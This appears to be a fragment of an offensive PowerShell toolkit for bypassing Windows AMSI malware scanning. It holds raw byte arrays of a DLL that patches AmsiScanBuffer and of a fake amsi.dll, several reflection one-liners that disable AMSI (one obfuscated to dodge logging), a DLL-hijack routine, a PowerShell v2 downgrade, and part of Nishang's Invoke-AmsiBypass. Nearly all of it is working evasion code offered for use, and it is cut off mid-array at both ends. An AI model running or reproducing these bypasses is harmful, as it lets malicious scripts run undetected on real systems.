0, 116, 0, 114, 0, 105, 0, 101, 0, 118, 0, 101, 0, 32, 0, 97, 0, 109, 0, 115, 0, 105, 0, 46, 0, 100, 0, 108, 0, 108, 0, 32, 0, 112, 0, 111, 0, 105, 0, 110, 0, 116, 0, 101, 0, 114, 0, 33, 0, 0, 29, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 0, 117, 69, 0, 82, 0, 82, 0, 79, 0, 82, 0, 58, 0, 32, 0, 67, 0, 111, 0, 117, 0, 108, 0, 100, 0, 32, 0, 110, 0, 111, 0, 116, 0, 32, 0, 114, 0, 101, 0, 116, 0, 114, 0, 105, 0, 101, 0, 118, 0, 101, 0, 32, 0, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 32, 0, 102, 0, 117, 0, 110, 0, 99, 0, 116, 0, 105, 0, 111, 0, 110, 0, 32, 0, 112, 0, 111, 0, 105, 0, 110, 0, 116, 0, 101, 0, 114, 0, 33, 0, 0, 117, 69, 0, 82, 0, 82, 0, 79, 0, 82, 0, 58, 0, 32, 0, 67, 0, 111, 0, 117, 0, 108, 0, 100, 0, 32, 0, 110, 0, 111, 0, 116, 0, 32, 0, 109, 0, 111, 0, 100, 0, 105, 0, 102, 0, 121, 0, 32, 0, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 32, 0, 109, 0, 101, 0, 109, 0, 111, 0, 114, 0, 121, 0, 32, 0, 112, 0, 101, 0, 114, 0, 109, 0, 105, 0, 115, 0, 115, 0, 105, 0, 111, 0, 110, 0, 115, 0, 33, 0, 0, 83, 71, 0, 114, 0, 101, 0, 97, 0, 116, 0, 32, 0, 115, 0, 117, 0, 99, 0, 99, 0, 101, 0, 115, 0, 115, 0, 46, 0, 32, 0, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 32, 0, 112, 0, 97, 0, 116, 0, 99, 0, 104, 0, 101, 0, 100, 0, 33, 0, 32, 0, 58, 0, 41, 0, 0, 0, 0, 0, 94, 196, 134, 67, 207, 43, 76, 71, 180, 110, 209, 17, 221, 107, 164, 138, 0, 4, 32, 1, 1, 8, 3, 32, 0, 1, 5, 32, 1, 1, 17, 17, 4, 32, 1, 1, 14, 13, 7, 10, 24, 24, 25, 9, 29, 5, 24, 2, 8, 2, 2, 2, 6, 24, 5, 0, 2, 2, 24, 24, 4, 0, 1, 1, 14, 4, 0, 1, 25, 11, 7, 0, 2, 1, 18, 81, 17, 85, 4, 0, 1, 24, 8, 8, 0, 4, 1, 29, 5, 8, 24, 8, 5, 0, 2, 24, 24, 8, 8, 204, 123, 19, 255, 205, 45, 221, 81, 3, 6, 17, 16, 4, 0, 1, 24, 14, 5, 0, 2, 24, 24, 14, 8, 0, 4, 2, 24, 25, 9, 16, 9, 6, 0, 3, 1, 24, 24, 8, 3, 0, 0, 8, 8, 1, 0, 8, 0, 0, 0, 0, 0, 30, 1, 0, 1, 0, 84, 2, 22, 87, 114, 97, 112, 78, 111, 110, 69, 120, 99, 101, 112, 116, 105, 111, 110, 84, 104, 114, 111, 119, 115, 1, 8, 1, 0, 7, 1, 0, 0, 0, 0, 54, 1, 0, 25, 46, 78, 69, 84, 83, 116, 97, 110, 100, 97, 114, 100, 44, 86, 101, 114, 115, 105, 111, 110, 61, 118, 50, 46, 48, 1, 0, 84, 14, 20, 70, 114, 97, 109, 101, 119, 111, 114, 107, 68, 105, 115, 112, 108, 97, 121, 78, 97, 109, 101, 0, 15, 1, 0, 10, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 0, 0, 10, 1, 0, 5, 68, 101, 98, 117, 103, 0, 0, 12, 1, 0, 7, 49, 46, 48, 46, 48, 46, 48, 0, 0, 10, 1, 0, 5, 49, 46, 48, 46, 48, 0, 0, 4, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 92, 168, 168, 0, 1, 77, 80, 2, 0, 0, 0, 100, 0, 0, 0, 128, 43, 0, 0, 128, 13, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 19, 0, 0, 0, 39, 0, 0, 0, 228, 43, 0, 0, 228, 13, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 82, 83, 68, 83, 215, 18, 206, 3, 139, 112, 185, 73, 189, 89, 99, 32, 233, 159, 0, 221, 1, 0, 0, 0, 47, 111, 112, 116, 47, 80, 114, 111, 106, 101, 99, 116, 115, 47, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 47, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 47, 111, 98, 106, 47, 68, 101, 98, 117, 103, 47, 110, 101, 116, 115, 116, 97, 110, 100, 97, 114, 100, 50, 46, 48, 47, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 46, 112, 100, 98, 0, 83, 72, 65, 50, 53, 54, 0, 215, 18, 206, 3, 139, 112, 185, 169, 125, 89, 99, 32, 233, 159, 0, 221, 32, 92, 168, 40, 54, 252, 229, 155, 150, 128, 72, 101, 126, 213, 146, 143, 51, 44, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 77, 44, 0, 0, 0, 32, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 63, 44, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 95, 67, 111, 114, 68, 108, 108, 77, 97, 105, 110, 0, 109, 115, 99, 111, 114, 101, 101, 46, 100, 108, 108, 0, 0, 0, 0, 0, 0, 255, 37, 0, 32, 0, 16, 49, 255, 144, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 16, 0, 0, 0, 24, 0, 0, 128, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 48, 0, 0, 128, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 72, 0, 0, 0, 88, 64, 0, 0, 212, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 212, 2, 52, 0, 0, 0, 86, 0, 83, 0, 95, 0, 86, 0, 69, 0, 82, 0, 83, 0, 73, 0, 79, 0, 78, 0, 95, 0, 73, 0, 78, 0, 70, 0, 79, 0, 0, 0, 0, 0, 189, 4, 239, 254, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 63, 0, 0, 0, 0, 0, 0, 0, 4, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 68, 0, 0, 0, 1, 0, 86, 0, 97, 0, 114, 0, 70, 0, 105, 0, 108, 0, 101, 0, 73, 0, 110, 0, 102, 0, 111, 0, 0, 0, 0, 0, 36, 0, 4, 0, 0, 0, 84, 0, 114, 0, 97, 0, 110, 0, 115, 0, 108, 0, 97, 0, 116, 0, 105, 0, 111, 0, 110, 0, 0, 0, 0, 0, 0, 0, 176, 4, 52, 2, 0, 0, 1, 0, 83, 0, 116, 0, 114, 0, 105, 0, 110, 0, 103, 0, 70, 0, 105, 0, 108, 0, 101, 0, 73, 0, 110, 0, 102, 0, 111, 0, 0, 0, 16, 2, 0, 0, 1, 0, 48, 0, 48, 0, 48, 0, 48, 0, 48, 0, 52, 0, 98, 0, 48, 0, 0, 0, 54, 0, 11, 0, 1, 0, 67, 0, 111, 0, 109, 0, 112, 0, 97, 0, 110, 0, 121, 0, 78, 0, 97, 0, 109, 0, 101, 0, 0, 0, 0, 0, 65, 0, 109, 0, 115, 0, 105, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 0, 0, 0, 0, 62, 0, 11, 0, 1, 0, 70, 0, 105, 0, 108, 0, 101, 0, 68, 0, 101, 0, 115, 0, 99, 0, 114, 0, 105, 0, 112, 0, 116, 0, 105, 0, 111, 0, 110, 0, 0, 0, 0, 0, 65, 0, 109, 0, 115, 0, 105, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 0, 0, 0, 0, 48, 0, 8, 0, 1, 0, 70, 0, 105, 0, 108, 0, 101, 0, 86, 0, 101, 0, 114, 0, 115, 0, 105, 0, 111, 0, 110, 0, 0, 0, 0, 0, 49, 0, 46, 0, 48, 0, 46, 0, 48, 0, 46, 0, 48, 0, 0, 0, 62, 0, 15, 0, 1, 0, 73, 0, 110, 0, 116, 0, 101, 0, 114, 0, 110, 0, 97, 0, 108, 0, 78, 0, 97, 0, 109, 0, 101, 0, 0, 0, 65, 0, 109, 0, 115, 0, 105, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 46, 0, 100, 0, 108, 0, 108, 0, 0, 0, 0, 0, 40, 0, 2, 0, 1, 0, 76, 0, 101, 0, 103, 0, 97, 0, 108, 0, 67, 0, 111, 0, 112, 0, 121, 0, 114, 0, 105, 0, 103, 0, 104, 0, 116, 0, 0, 0, 32, 0, 0, 0, 70, 0, 15, 0, 1, 0, 79, 0, 114, 0, 105, 0, 103, 0, 105, 0, 110, 0, 97, 0, 108, 0, 70, 0, 105, 0, 108, 0, 101, 0, 110, 0, 97, 0, 109, 0, 101, 0, 0, 0, 65, 0, 109, 0, 115, 0, 105, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 46, 0, 100, 0, 108, 0, 108, 0, 0, 0, 0, 0, 54, 0, 11, 0, 1, 0, 80, 0, 114, 0, 111, 0, 100, 0, 117, 0, 99, 0, 116, 0, 78, 0, 97, 0, 109, 0, 101, 0, 0, 0, 0, 0, 65, 0, 109, 0, 115, 0, 105, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 0, 0, 0, 0, 48, 0, 6, 0, 1, 0, 80, 0, 114, 0, 111, 0, 100, 0, 117, 0, 99, 0, 116, 0, 86, 0, 101, 0, 114, 0, 115, 0, 105, 0, 111, 0, 110, 0, 0, 0, 49, 0, 46, 0, 48, 0, 46, 0, 48, 0, 0, 0, 56, 0, 8, 0, 1, 0, 65, 0, 115, 0, 115, 0, 101, 0, 109, 0, 98, 0, 108, 0, 121, 0, 32, 0, 86, 0, 101, 0, 114, 0, 115, 0, 105, 0, 111, 0, 110, 0, 0, 0, 49, 0, 46, 0, 48, 0, 46, 0, 48, 0, 46, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 12, 0, 0, 0, 96, 60, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)) | Out-Null; Write-Output \"DLL has been reflected\"; } [Bypass.AMSI]::Patch(); } MyPatch; Start-Sleep 1; Using Matt Graebers Reflection method [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) Using Matt Graebers Reflection method with WMF5 autologging bypass [Delegate]::CreateDelegate((\"Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]\" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True) Using Matt Graebers second Reflection method [Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141) Using Cornelis de Plaas DLL hijack method [Byte[]] $temp = $DllBytes -split ' ' Write-Output \"Executing the bypass.\" Write-Verbose \"Dropping the fake amsi.dll to disk.\" [System.IO.File]::WriteAllBytes(\"$pwd\\amsi.dll\", $temp) Write-Verbose \"Copying powershell.exe to the current working directory.\" Copy-Item -Path C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Destination $pwd Write-Verbose \"Starting powershell.exe from the current working directory.\" & \"$pwd\\powershell.exe\" Using PowerShell version 2 if ($ShowOnly -eq $True) { Write-Output \"If .Net version 2.0.50727 is installed, run powershell -v 2 and run scripts from the new PowerShell process.\" } else { Write-Verbose \"Checking if .Net version 2.0.50727 is installed.\" $versions = Get-ChildItem 'HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP' -recurse | Get-ItemProperty -name Version -EA 0 | Where { $_.PSChildName -match '^(?!S)\\p{L}'} | Select -ExpandProperty Version if($versions -match \"2.0.50727\") { Write-Verbose \".Net version 2.0.50727 found.\" Write-Output \"Executing the bypass.\" powershell.exe -version 2 } else { Write-Verbose \".Net version 2.0.50727 not found. Can't start PowerShell v2.\" } } Nishang all in one function Invoke-AmsiBypass { <# .SYNOPSIS Nishang script which uses publicly known methods to bypass/avoid AMSI. .DESCRIPTION This script implements publicly known methods bypass or avoid AMSI on Windows machines. AMSI is a script malware detection mechanism enabled by default in Windows 10. (https://msdn.microsoft.com/en-us/library/windows/desktop/dn889587(v=vs.85).aspx) This script implements 6 methods of bypassing AMSI. unload - Method by Matt Graeber. Unloads AMSI from current PowerShell session. unload2 - Another method by Matt Graeber. Unloads AMSI from current PowerShell session. unloadsilent - Another method by Matt Graeber. Unloads AMSI and avoids WMF5 autologging. unloadobfuscated - 'unload' method above obfuscated with Daneil Bohannon's Invoke-Obfuscation - which avoids WMF5 autologging. dllhijack - Method by Cornelis de Plaa. The amsi.dll used in the code is from p0wnedshell (https://github.com/Cn33liz/p0wnedShell) psv2 - If .net 2.0.50727 is available on Windows 10. PowerShell v2 is launched which doesn't support AMSI. The script also provides information on tools which can be used for obfuscation: ISE-Steroids (http://www.powertheshell.com/isesteroidsmanual/download/) Invoke-Obfuscation (https://github.com/danielbohannon/Invoke-Obfuscation) .PARAMETER Method The method to be used for elevation. Defaut one is unloadsilent. .PARAMETER ShowOnly The bypass is not executed. Just shown to the user. .EXAMPLE PS > Invoke-AmsiBypass -Verbose Above command runs the unloadsilent method. .EXAMPLE PS > Invoke-PsUACme -Method unloadobfuscated -Verbose Above command runs the unloadobfuscated method. .LINK http://www.labofapenetrationtester.com/2016/09/amsi.html https://github.com/samratashok/nishang #> [CmdletBinding()] Param( [Parameter(Position = 0, Mandatory = $False)] [ValidateSet(\"unload\",\"unloadsilent\",\"unloadobfuscated\",\"unload2\",\"dllhijack\",\"psv2\",\"obfuscation\")] [String] $Method = \"unloadsilent\", [Parameter(Position = 1, Mandatory = $False)] [Switch] $ShowOnly ) $AmsiX86 = \"77 90 144 0 3 0 0 0 4 0 0 0 255 255 0 0 184 0 0 0 0 0 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 248 0 0 0 14 31 186 14 0 180 9 205 33 184 1 76 205 33 84 104 105 115 32 112 114 111 103 114 97 109 32 99 97 110 110 111 116 32 98 101 32 114 117 110 32 105 110 32 68 79 83 32 109 111 100 101 46 13 13 10 36 0 0 0 0 0 0 0 190 171 71 149 250 202 41 198 250 202 41 198 250 202 41 198 243 178 186 198 248 202 41 198 148 145 40 199 249 202 41 198 148 145 42 199 251 202 41 198 148 145 44 199 242 202 41 198 148 145 45 199 241 202 41 198 39 53 226 198 248 202 41 198 250 202 40 198 231 202 41 198 40 145 33 199 251 202 41 198 40 145 214 198 251 202 41 198 40 145 43 199 251 202 41 198 82 105 99 104 250 202 41 198 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 69 0 0 76 1 6 0 144 29 62 87 0 0 0 0 0 0 0 0 224 0 2 33 11 1 14 0 0 14 0 0 0 18 0 0 0 0 0 0 43 19 0 0 0 16 0 0 0 32 0 0 0 0 0 16 0 16 0 0 0 2 0 0 6 0 0 0 0 0 0 0 6 0 0 0 0 0 0 0 0 112 0 0 0 4 0 0 0 0 0 0 2 0 64 1 0 0 16 0 0 16 0 0 0 0 16 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 0 148 36 0 0 80 0 0 0 0 80 0 0 224 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 96 0 0 44 1 0 0 176 32 0 0 112 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 33 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 112 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 46 116 101 120 116 0 0 0 124 12 0 0 0 16 0 0 0 14 0 0 0 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 96 46 114 100 97 116 97 0 0 220 7 0 0 0 32 0 0 0 8 0 0 0 18 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 100 97 116 97 0 0 0 136 3 0 0 0 48 0 0 0 2 0 0 0 26 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 192 46 103 102 105 100 115 0 0 20 0 0 0 0 64 0 0 0 2 0 0 0 28 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 115 114 99 0 0 0 224 1 0 0 0 80 0 0 0 2 0 0 0 30 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 101 108 111 99 0 0 44 1 0 0 0 96 0 0 0 2 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 66 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 51 192 194 12 0 59 13 4 48 0 16 242 117 2 242 195 242 233 96 3 0 0 85 139 236 139 69 12 131 232 0 116 51 131 232 1 116 32 131 232 1 116 17 131 232 1 116 5 51 192 64 235 48 232 245 4 0 0 235 5 232 207 4 0 0 15 182 192 235 31 255 117 16 255 117 8 232 24 0 0 0 89 235 16 131 125 16 0 15 149 192 15 182 192 80 232 23 1 0 0 89 93 194 12 0 106 16 104 24 36 0 16 232 123 9 0 0 106 0 232 35 5 0 0 89 132 192 117 7 51 192 233 224 0 0 0 232 40 4 0 0 136 69 227 179 1 136 93 231 131 101 252 0 131 61 60 51 0 16 0 116 7 106 7 232 203 7 0 0 199 5 60 51 0 16 1 0 0 0 232 74 4 0 0 132 192 116 101 232 206 8 0 0 104 186 25 0 16 232 177 6 0 0 232 93 7 0 0 199 4 36 57 24 0 16 232 160 6 0 0 232 112 7 0 0 199 4 36 128 32 0 16 104 124 32 0 16 232 78 11 0 0 89 89 133 192 117 41 232 237 3 0 0 132 192 116 32 104 120 32 0 16 104 116 32 0 16 232 42 11 0 0 89 89 199 5 60 51 0 16 2 0 0 0 50 219 136 93 231 199 69 252 254 255 255 255 232 68 0 0 0 132 219 15 133 76 255 255 255 232 52 7 0 0 139 240 131 62 0 116 30 86 232 40 5 0 0 89 132 192 116 19 255 117 12 106 2 255 117 8 139 54 139 206 232 136 8 0 0 255 214 255 5 24 48 0 16 51 192 64 232 201 8 0 0 195 138 93 231 255 117 227 232 131 5 0 0 89 195 106 12 104 56 36 0 16 232 105 8 0 0 161 24 48 0 16 133 192 127 4 51 192 235 79 72 163 24 48 0 16 232 22 3 0 0 136 69 228 131 101 252 0 131 61 60 51 0 16 2 116 7 106 7 232 190 6 0 0 232 180 3 0 0 131 37 60 51 0 16 0 199 69 252 254 255 255 255 232 27 0 0 0 106 0 255 117 8 232 65 5 0 0 89 89 51 201 132 192 15 149 193 139 193 232 78 8 0 0 195 232 164 3 0 0 255 117 228 232 6 5 0 0 89 195 106 12 104 88 36 0 16 232 236 7 0 0 131 101 252 0 139 125 12 131 255 1 116 10 131 255 2 116 5 139 93 8 235 49 255 117 16 87 139 93 8 83 232 218 0 0 0 139 240 137 117 228 133 246 15 132 190 0 0 0 255 117 16 87 83 232 216 253 255 255 139 240 137 117 228 133 246 15 132 167 0 0 0 131 255 1 117 7 83 232 198 9 0 0 89 255 117 16 87 83 232 159 253 255 255 139 240 137 117 228 131 255 1 117 43 133 246 117 30 255 117 16 80 83 232 135 253 255 255 255 117 16 86 83 232 147 253 255 255 255 117 16 86 83 232 116 0 0 0 131 255 1 117 4 133 246 116 4 133 255 117 11 83 232 130 9 0 0 89 133 255 116 5 131 255 3 117 72 255 117 16 87 83 232 98 253 255 255 139 240 137 117 228 133 246 116 53 255 117 16 87 83 232 58 0 0 0 139 240 235 36 139 77 236 139 1 81 255 48 104 22 16 0 16 255 117 16 255 117 12 255 117 8 232 86 2 0 0 131 196 24 195 139 101 232 51 246 137 117 228 199 69 252 254 255 255 255 139 198 232 54 7 0 0 195 85 139 236 86 139 53 160 32 0 16 133 246 117 5 51 192 64 235 18 255 117 16 139 206 255 117 12 255 117 8 232 193 6 0 0 255 214 94 93 194 12 0 85 139 236 131 125 12 1 117 5 232 88 4 0 0 255 117 16 255 117 12 255 117 8 232 177 254 255 255 131 196 12 93 194 12 0 85 139 236 106 0 255 21 40 32 0 16 255 117 8 255 21 0 32 0 16 104 9 4 0 192 255 21 4 32 0 16 80 255 21 8 32 0 16 93 195 85 139 236 129 236 36 3 0 0 106 23 232 234 8 0 0 133 192 116 5 106 2 89 205 41 163 32 49 0 16 137 13 28 49 0 16 137 21 24 49 0 16 137 29 20 49 0 16 137 53 16 49 0 16 137 61 12 49 0 16 102 140 21 56 49 0 16 102 140 13 44 49 0 16 102 140 29 8 49 0 16 102 140 5 4 49 0 16 102 140 37 0 49 0 16 102 140 45 252 48 0 16 156 143 5 48 49 0 16 139 69 0 163 36 49 0 16 139 69 4 163 40 49 0 16 141 69 8 163 52 49 0 16 139 133 220 